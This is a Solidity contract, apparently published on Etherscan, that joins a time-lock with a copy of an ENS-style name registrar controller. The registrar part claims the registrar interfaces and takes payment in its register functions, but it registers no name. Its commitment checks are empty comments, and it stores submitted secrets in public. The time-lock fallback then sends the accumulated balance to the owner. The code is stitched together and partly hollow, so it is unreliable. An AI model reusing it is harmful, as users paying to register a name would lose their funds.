/**
 *Submitted for verification at Etherscan.io on 2022-01-03
*/

pragma solidity >=0.4.24;


contract Lock {
    constructor (address owner, uint256 unlockTime) public payable {
        assembly {
            sstore(0x00, owner)
            sstore(0x01, unlockTime)
        }
    }


    function () external payable {
        assembly {
            switch gt(timestamp, sload(0x01))
            case 0 {revert(0,0)}
            case 1 {
                switch call(gas, sload(0x00), balance(address), 0,0,0,0)
                case 0 {revert(0,0)}
            }
        }
    }


    bytes4 constant private INTERFACE_META_ID = bytes4(keccak256("supportsInterface(bytes4)"));
    bytes4 constant private COMMITMENT_CONTROLLER_ID = bytes4(
        keccak256("rentPrice(string,uint256)") ^
        keccak256("available(string)") ^
        keccak256("makeCommitment(string,address,bytes32)") ^
        keccak256("commit(bytes32)") ^
        keccak256("register(string,address,uint256,bytes32)") ^
        keccak256("renew(string,uint256)")
    );

    bytes4 constant private COMMITMENT_WITH_CONFIG_CONTROLLER_ID = bytes4(
        keccak256("registerWithConfig(string,address,uint256,bytes32,address,address)") ^
        keccak256("makeCommitmentWithConfig(string,address,bytes32,address,address)")
    );


    mapping(bytes32=>uint) public commitments;
    mapping(bytes32=>bytes32) public secretToCommitment;


    event NameRegistered(string name, bytes32 indexed label, address indexed owner, uint cost, uint expires);
    event NameRenewed(string name, bytes32 indexed label, uint cost, uint expires);
    event NewPriceOracle(address indexed oracle);




    function makeCommitment(string memory name, address owner, bytes32 secret) pure public returns(bytes32) {
        return makeCommitmentWithConfig(name, owner, secret, address(0), address(0));
    }

    function makeCommitmentWithConfig(string memory name, address owner, bytes32 secret, address resolver, address addr) pure public returns(bytes32) {
        bytes32 label = keccak256(bytes(name));
        if (resolver == address(0) && addr == address(0)) {
            return keccak256(abi.encodePacked(label, owner, secret));
        }
        require(resolver != address(0));
        return keccak256(abi.encodePacked(label, owner, resolver, addr, secret));
    }

    function commit(bytes32 commitment) public {
        commitments[commitment] = now;
    }

    function register(string calldata name, address owner, uint duration, bytes32 secret) external payable {
      registerWithConfig(name, owner, duration, secret, address(0), address(0));
    }

    function registerWithConfig(string memory name, address owner, uint duration, bytes32 secret, address resolver, address addr) public payable {
        bytes32 commitment = makeCommitmentWithConfig(name, owner, secret, resolver, addr);
        secretToCommitment[secret] = commitment;
        uint cost = _consumeCommitment(name, duration, commitment);

        bytes32 label = keccak256(bytes(name));
        uint256 tokenId = uint256(label);


    }



    function supportsInterface(bytes4 interfaceID) external pure returns (bool) {
        return interfaceID == INTERFACE_META_ID ||
               interfaceID == COMMITMENT_CONTROLLER_ID ||
               interfaceID == COMMITMENT_WITH_CONFIG_CONTROLLER_ID;
    }

    function _consumeCommitment(string memory name, uint duration, bytes32 commitment) internal returns (uint256) {
        // Require a valid commitment

        // If the commitment is too old, or the name is registered, stop

        delete(commitments[commitment]);

        return 0;
    }


}